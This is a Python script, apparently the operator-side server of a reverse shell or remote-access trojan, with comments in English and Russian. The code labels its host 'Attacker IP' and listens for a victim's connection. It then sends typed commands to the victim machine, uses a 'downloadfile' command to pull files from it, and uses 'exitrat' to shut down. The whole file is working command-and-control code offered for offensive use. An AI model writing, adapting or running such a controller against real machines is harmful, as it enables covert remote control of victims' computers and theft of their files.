import socket
import sys

main_logo = r'''
 _                       __                _        __
|_) _     _  __ _  _    (_ |_  _  |  |    |_) \/   |_  _  __|_  _  __
| \(/_\_/(/_ | _> (/_   __)| |(/_ |_ |_   |_) /    |  (_| | |_)(/_ |
'''

print(main_logo)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = '127.0.0.1'  # Attacker IP (your) / Айпи атакующего (Ваш)

# Check if port to listen was entered / Проверка был ли введен порт для прослушивания
try:
    PORT = int(sys.argv[1])
except Exception as ex:
    print('Usage: python3 reverse_shell_server.py <port>\n' + str(ex))
    sys.exit(1)


def main():
    # Start to listen and wait for connect / Ожидание подключения
    s.bind((HOST, PORT))
    s.listen(10)
    print('RSBF server listening on port {}...'.format(PORT))

    # Accept connection / Принятие подключения
    conn, _ = s.accept()

    # Command processor / Обработчик команд
    while True:
        # Variable with command / Переменная с командой
        cmd = input('RSBF> ').rstrip()

        # If command = nothing - continue loop / Если команда ничему не равна -  продолжаем цикл
        if cmd == '':
            continue

        # Send command to client / Отправляем команды клиенту
        conn.send(bytes(cmd, encoding="utf-8", errors="ignore"))

        # Stop server / Останавливаем сервер
        if cmd == 'exitrat':
            s.close()
            sys.exit(0)

        # Function of downloading files / Функция загрузки файлов
        if cmd == "downloadfile":
            # Name of the file in which we will write bytes / Имя файла в который будут записаны байты
            f = open("FILENAME", "wb")
            while True:
                # Get file bytes / Получаем байты
                data = conn.recv(4096)
                if not data:
                    break
                # Write bytes on file / Записываем байты в файл
                f.write(data)
            f.close()
            print('Done sending\n')

        # Variable with client answer / Переменная с ответом от сервера
        data = conn.recv(4096)
        print(str(data, encoding="utf-8", errors="ignore"))


if __name__ == '__main__':
    main()
